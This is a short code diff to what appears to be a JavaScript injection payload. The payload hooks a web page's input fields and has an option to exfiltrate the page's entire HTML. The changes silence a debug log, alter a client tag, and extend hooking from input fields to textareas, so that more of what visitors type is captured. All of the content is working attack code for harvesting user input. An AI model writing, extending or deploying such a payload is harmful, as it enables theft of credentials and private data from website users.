@@ -105,7 +105,7 @@ function initGlobals()
 
 	window.addEventListener("beforeunload", function()
 	{
-		console.log("**** Unloading page, removing payload loaded flag...");
+		//console.log("**** Unloading page, removing payload loaded flag...");
 		sessionStorage.removeItem("taperSystemLoaded");
 	});
 
@@ -113,7 +113,7 @@ function initGlobals()
 
 
 	// Should we set an optional client tag?
-	window.taperTag = "ost1";
+	window.taperTag = "oc1";
 
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
@@ -279,7 +279,8 @@ function hookInputs()
 		myReference = document;
 	}
 
-	inputs = myReference.getElementsByTagName('input');
+	//inputs = myReference.getElementsByTagName('input');
+	inputs = myReference.querySelectorAll('input,textarea');
 	for (index = 0; index < inputs.length; index++)
 	{
 		// Check to see if we've already hooked the input field. 
